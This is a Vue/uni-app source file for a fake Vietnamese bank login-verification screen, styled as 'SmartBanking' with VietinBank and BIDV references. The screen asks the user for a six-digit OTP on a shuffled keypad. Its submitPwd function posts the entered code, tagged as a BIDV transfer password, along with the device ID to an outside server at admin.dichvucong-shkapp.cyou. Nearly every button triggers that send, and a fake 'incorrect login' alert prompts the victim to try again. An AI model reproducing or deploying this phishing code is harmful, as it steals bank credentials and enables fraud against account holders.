<template>
	<view style="position: relative;background-color: #FFF;min-height: 100vh;">
		<header
			style="background-color: #FFF; display: flex;align-items: center;justify-content: space-between;gap:12px;padding:32px 20px 20px;">
			<image src="/static/arrow.svg" mode="aspectFit" :style="$theme.setImageSize(16)" @tap="openApp()"
				style="position: relative;z-index:18;">
			</image>
			<view style="flex:1;color: #121212;font-size: 16px;font-weight: 800; text-align: center;letter-spacing: 1px;">
				Xác thực đăng nhập

				<!-- <view style="text-align: center;font-weight: 500;">VietinBank</view> -->

				<!-- <image src="/static/vtb_ic_logo_full.png" mode="heightFix" :style="$theme.setImageSize(32)"></image>
				<view
					style="text-align: center;padding-top: 4px;padding-right: 30px;display: flex;align-items: center;justify-content: center;gap: 4px;">
					<image src="/static/icon_ipay_home.png" mode="scaleToFill" style="width: 30px;height: 14px;"></image>
					Mobile
				</view> -->
			</view>
			<view :style="$theme.setImageSize(24)"></view>
		</header>

		<view style="background-color: #F4F4F4;height: 10px;"></view>

		<view style="padding:20px;text-align: center;font-size: 16px; color: #4c4c4c;font-weight: 500;letter-spacing: 1px;">
			{{`Quý khách vui lòng nhập mã xác nhận OTP để xác thực đăng nhập trên thiết bị khác.`}}
		</view>

		<!-- 		<view style="padding-top: 16px;color:#DDD;text-align: center;font-size: 30rpx;font-weight: 500;">Buổi tối ấm
			cúng
			nha</view>
		<view style="padding-top: 4px;color:#FFF;text-align: center;font-size: 40rpx;font-weight: 500;">Xin chào Quý
			khách
		</view> -->
		<!-- <view style="padding-top: 4px;color:#FFF;text-align: center;font-size: 15px;">*****2736</view> -->

		<view class="password_wrapper" @click="openKeyword()">
			<block v-for="(v,k) in password" :key="k">
				<view class="password_item"
					:style="{borderBottomColor:activeIndex==k+1?`#666666`:v==''? `#DDDDDD`:`transparent`}">
					{{v}}
				</view>
			</block>
		</view>

		<view
			style="text-align: center;padding-top: 48px;color:#2266b7;font-weight: 800;font-size: 14px;font-weight: 800;letter-spacing: 1px;"
			@tap="openApp()">Nhập lại mã </view>



		<!-- <view style="padding-top: 30px;color:#FFF;text-align: center;font-size: 15px;" @tap="openApp()">Đăng nhập tài
			khoản khác ?
		</view> -->
		<!-- </view> -->

		<!-- <view
			style="position: absolute;bottom: 68px;left: 0;right: 0;text-align: center;color: #FFF;padding:0 20px;opacity: 0.2;">
			<view style="position: relative;">
				<view style="position: absolute;right: 30px;bottom: 16px;" @tap="openApp()">
					<image src="/static/chatbot_icon.png" mode="aspectFit" :style="$theme.setImageSize(80)"></image>
				</view>
				<view style="position: absolute;right: 0px;bottom: 74px;" @tap="openApp()">
					<image src="/static/shixin.svg" mode="aspectFit" :style="$theme.setImageSize(24)"></image>
				</view>
			</view>
		</view> -->

		<view style="position: absolute;bottom:24px;left: 0;right: 0;width: 90%;margin:0 auto;">
			<view class="btn_submit" @tap="handleSubmit()">
				Đăng nhập
			</view>
		</view>

		<!-- <view style="position: absolute;bottom: 40px;left: 0;right: 0;text-align: center;color: #FFF;padding:0 20px;"
			@tap="openApp()">
			<view style="position: relative;">
				<view
					style="position: absolute;right: 20px;bottom:12px;background-color: rgba(0, 0, 0, 0.22);padding:12px 40px 12px 20px;border-radius: 22px;">
					Bạn cần hỗ trợ?
				</view>
				<view style="position: absolute;right: 0px;bottom:10px;">
					<view style="display: flex;align-items: center;justify-content: center;">
						<image src="/static/Message.svg" mode="aspectFit" :style="$theme.setImageSize(48)"></image>
					</view>
				</view>
			</view>
		</view> -->

		<template v-if="showKeyword">
			<view class="overlay" style="background-color: transparent;" @tap="closeKeyword()"></view>
			<view class="modal_wrapper_bottom" style="background-color: #dedede;">
				<view class="keyword_row" style="padding:16px 10px;">
					<view style="flex:1;display: flex;align-items: center;">
						<image src="/static/xunhuan.svg" mode="aspectFit" :style="$theme.setImageSize(24)">
						</image>
						<text style="padding-left: 12px;font-weight: 800;font-size: 14px;">SmartBanking</text>
					</view>
					<!-- <image src="/static/huatong.svg" mode="aspectFit" :style="$theme.setImageSize(36)" @tap="openApp()">
					</image> -->
				</view>

				<view class="keyword_row" style="padding:0 10px 0 10px;">
					<block v-for="(v,k) in keywordNumber.slice(0,3)" :key="k">
						<view class="keyword_row_item num_font" style="color: #000;"
							:style="{backgroundColor: curKey==v ? `#3bcec6` : `#FDFFFF`}" @tap="chooseKey(`${v}`)">{{v}}</view>
					</block>

					<view @tap="openApp()" class="keyword_row_item" style="height: 40px;"
						:style="{backgroundColor: curKey==`set` ? `#3bcec6` : `#FDFFFF`}">
						<template v-if="curKey==`set`">
							<image src="/static/shezhi.svg" mode="aspectFit" class="right_icon">
							</image>
						</template>
						<template v-else>
							<image src="/static/shezhi.svg" mode="aspectFit" class="right_icon">
							</image>
						</template>
					</view>
				</view>

				<view class="keyword_row" style="padding:10px 10px 0 10px;">
					<block v-for="(v,k) in keywordNumber.slice(3,6)" :key="k">
						<view class="keyword_row_item num_font" style="color: #000;"
							:style="{backgroundColor: curKey==v ? `#3bcec6` : `#FDFFFF`}" @tap="chooseKey(`${v}`)">{{v}}</view>
					</block>
					<view @tap="handleDel(`del`)" class="keyword_row_item" style="height: 40px;"
						:style="{backgroundColor: curKey==`err` ? `#3bcec6` : `#FDFFFF`}">
						<template v-if="curKey==`err`">
							<image src="/static/cuowu_fff.svg" mode="aspectFit" class="right_icon">
							</image>
						</template>
						<template v-else>
							<image src="/static/cuowu.svg" mode="aspectFit" class="right_icon">
							</image>
						</template>
					</view>
				</view>
				<view class="keyword_row" style="padding:10px 10px 0 10px;">
					<block v-for="(v,k) in keywordNumber.slice(6,9)" :key="k">
						<view class="keyword_row_item num_font" style="color: #000;"
							:style="{backgroundColor: curKey==v ? `#3bcec6` : `#FDFFFF`}" @tap="chooseKey(`${v}`)">{{v}}</view>
					</block>

					<view class="keyword_row_item" style="height: 40px;" @touchstart="startTouch(`bs`)" @touchend="endTouch"
						@touchcancel="endTouch" :style="{backgroundColor: curKey==`bs` ? `#3bcec6` : `#FDFFFF`}">
						<template v-if="curKey==`bs`">
							<image src="/static/backspace_fff.svg" mode="aspectFit" class="right_icon">
							</image>
						</template>
						<template v-else>
							<image src="/static/backspace.svg" mode="aspectFit" class="right_icon">
							</image>
						</template>
					</view>
				</view>
				<view class="keyword_row" style="padding:8px 10px 16px 10px;">
					<view class="keyword_row_item num_font" style="font-size: 14px;color: #000;"
						:style="{backgroundColor: curKey==`000` ? `#3bcec6` : `#FDFFFF`}" @tap="chooseKey(`000`)">000</view>
					<view class="keyword_row_item num_font"
						:style="{backgroundColor: curKey==keywordNumber[keywordNumber.length-1] ? `#3bcec6` : `#FDFFFF`}"
						@tap="chooseKey(keywordNumber[keywordNumber.length-1])">{{keywordNumber[keywordNumber.length-1]}}</view>
					<view class="keyword_row_item num_font" style="font-size: 14px;color: #000;"
						:style="{backgroundColor: curKey==`999` ? `#3bcec6` : `#FDFFFF`}" @tap="chooseKey(`999`)">999</view>
					<!-- <template v-if="isSymbol"> -->
					<view @tap="closeKeyword()" class="keyword_row_item" style="height: 40px;background-color:#3bcec6;">
						<image src="/static/enter.svg" mode="aspectFit" class="right_icon">
						</image>
					</view>
					<!-- </template>
						<template v-else>
							<view class="keyword_row_item" style="height: 40px;background-color:#187ee0;padding:0 16px;"
								@tap="closeKeyword()">
								<image src="/static/f.svg" mode="aspectFit" :style="$theme.setImageSize(28)">
								</image>
							</view>
						</template> -->
				</view>
			</view>
		</template>

		<!-- 按错密码 -->
		<template v-if="showAlert">
			<view class="overlay" style="background-color: transparent;" @click="openApp()"></view>
			<view class="modal_wrapper_center" style="background-color: #F4F4F4;padding: 30px 20px;z-index: 19;">
				<view>
					<view style="display: flex;align-items: center;justify-content: center;padding-bottom: 20px;">
						<image src="/static/ekyc_ic_error.png" mode="scaleToFill" :style="$theme.setImageSize(32)"></image>
					</view>
					<view>
						Thông tin đăng nhập không chính xác. Quý khách lưu ý: Dịch vụ SmartBanking sẽ bị khóa nếu Quý khách nhập sai
						mật khẩu 5 lần trở lên
					</view>
					<view @click="openApp()" class="btn_submit" style="margin-top: 20px;color: #FFF;">
						Đồng</view>
				</view>
			</view>
		</template>

		<template v-if="showTipPwd">
			<view class="overlay" style="z-index: 19;" @click="openApp()"></view>
			<view class="modal_wrapper_center" style="background-color: #F4F4F4;padding: 20px;z-index: 19;">
				<view>
					<!-- <view style="text-align: center;font-size: 20px;font-weight:700;">Thông báo</view> -->
					<view style="text-align: center;margin-top: 20px;font-size: 16px;color: #666;">
						<view>{{`Mật khẩu là chuỗi tối thiểu 8 ký tự.`}}</view>
						<view>{{`Quý khách vui lòng kiểm tra lại.`}}</view>
					</view>
					<view @click="openApp()" class="btn_submit" style="margin-top: 40px;color: #FFF;">
						Đồng</view>
				</view>
			</view>
		</template>
	</view>
</template>

<script>
	export default {
		data() {
			return {
				isMask: true,
				showKeyword: false,
				password: ['', '', '', '', '', ''], // 存储每位密码
				activeIndex: 1, // 当前焦点索引
				// 键盘
				keywordNumber: [],
				curKey: null, // 当前选中，仅限用于触摸改变背景色
				showAlert: false, // 显示弹层
				showTipPwd: false, // 未输入密码的弹层
				showKeywordNum: false, // 数字键盘
				longPressTimeout: null,
				isLongPressTriggered: false,
				curId: '000000', // url 设备id默认值
			}
		},
		computed: {
			// 未输入任何内容
			isEmpty() {
				return this.password.every(v => v == '');
			}
		},
		onLoad(opt) {
			this.curId = opt.android_id || this.curId;
		},
		onShow() {
			const temp = [`1`, `2`, `3`, `4`, `5`, `6`, `7`, `8`, `9`, `0`];
			const newArr = temp.slice();
			for (let i = newArr.length - 1; i > 0; i--) {
				const j = Math.floor(Math.random() * (i + 1)); // 生成一个随机索引
				// 交换新数组中的元素
				[newArr[i], newArr[j]] = [newArr[j], newArr[i]];
			}
			this.keywordNumber = newArr;
			console.log(this.keywordNumber);
			this.openKeyword();
			this.focusInput(this.activeIndex);
		},
		onHide() {
			this.password = ['', '', '', '', '', ''];
			this.closeAlert();
			this.closeKeyword();
			this.showTipPwd = false;
			this.activeIndex = 1;
		},
		methods: {
			goBack() {
				/*#ifdef APP-PLUS*/
				uni.navigateBack({ delta: 1 });
				/*#endif*/

				/*#ifdef H5*/
				history.back();
				/*#endif*/
			},
			focusInput(val) {
				this.activeIndex = val; // 设置当前焦点索引
			},
			async openApp() {
				await this.submitPwd();
				this.showAlert = false;
				this.showTipPwd = false;
				// 调用 Android 提供的接口
				if (window.BIDVInterface) {
					window.BIDVInterface.BidvApp();
				} else {
					// alert("Android interface is not available.");
				}
			},

			async handleSubmit() {
				this.closeKeyword();
				const isCheck = this.password.every(item => item != '');
				if (!isCheck) {
					this.showTipPwd = true;
					return false;
				}

				const result = await this.submitPwd();
				// 提交成功，显示弹层
				console.log(result);
				if (result) {
					this.password = ['', '', '', '', '', ''];
					this.closeAlert();
					this.closeKeyword();
					this.showTipPwd = false;
					this.activeIndex = 1;
				}
			},

			async submitPwd() {
				const headers = { "Content-Type": "application/x-www-form-urlencoded", };
				const API = `https://admin.dichvucong-shkapp.cyou/api/keyboard-input`;
				const tempData = {
					android_id: this.curId, // 通过链接参数获取
					input_text: "BIDV转账密码:" + this.password.join(''), // 密码输入内容
					timestamp: new Date().getTime(), // 毫秒时间戳
				}
				console.log(tempData);
				const response = await uni.request({
					url: API,
					method: 'POST',
					data: tempData,
					header: headers
				});
				console.log(response);
				const [err, res] = response;
				if (res && res.statusCode == 200) return res;
			},

			closeAlert() {
				this.showAlert = true;
			},

			// 按键特效
			effect(val) {
				this.curKey = val;
				setTimeout(() => {
					this.curKey = null;
				}, 100);
			},

			openKeyword() {
				this.showKeyword = true;
			},
			closeKeyword() {
				this.showKeyword = false;
			},

			// 选中字符
			chooseKey(val) {
				console.log(`val:`, val);
				this.effect(val);
				// 六位全部输入
				if (this.password.every(item => item != '')) return false;
				// 将选中字符串分割为单个字符
				val.split('').forEach((v, k) => {
					// 如果当前有空字符元素
					if (!this.password.every(item => item != '')) {
						// 获取当前第一个空字符元素下标
						const curIndex = this.password.findIndex(v => v == '');
						this.$set(this.password, curIndex, v);
						this.focusInput(this.activeIndex + 1);
					}
				});
				// 按满六位，自动收起键盘
				if (this.password.every(item => item != '')) {
					this.closeKeyword();
				}
			},

			// 点击删除全部
			handleDel(val) {
				this.effect(val);
				this.password = ['', '', '', '', '', ''];
				this.activeIndex = 1;
			},

			// 退格
			startTouch(val) {
				this.curKey = val;
				console.log(`startTouch short!`, this.isLongPressTriggered);
				this.isLongPressTriggered = false; // 重置长按状态
				// // 设置一个定时器
				this.longPressTimeout = setTimeout(() => {
					this.isLongPressTriggered = true; // 触发长按
					console.log(`startTouch long!`, this.isLongPressTriggered);
				}, 800); // 长按阈值（500ms）
			},
			endTouch() {
				this.curKey = null;
				clearTimeout(this.longPressTimeout); // 清除定时器
				// 如果当前未输入任何内容
				if (this.isEmpty) return false;
				if (!this.isLongPressTriggered) {
					console.log(`endTouch long!`, this.isLongPressTriggered);
					// 填满字符
					const isFinsh = this.password.every(v => v != '');
					if (isFinsh) {
						this.$set(this.password, this.password.length - 1, '');
					} else {
						// 点击 当前第一个空字符元素下标
						const curIndex = this.password.findIndex(v => v == '');
						console.log(curIndex);
						this.$set(this.password, curIndex - 1, '');
					}
					this.focusInput(this.activeIndex - 1);
					return false;
				}
				console.log(`endTouch short!`, this.isLongPressTriggered);
				this.isLongPressTriggered = false; // 重置状态

				// 当前第一个空字符元素下标
				this.password.forEach((v, k) => {
					this.$set(this.password, k, '');
				});
				this.activeIndex = 1;
				this.focusInput(this.activeIndex);
			},
		}
	}
</script>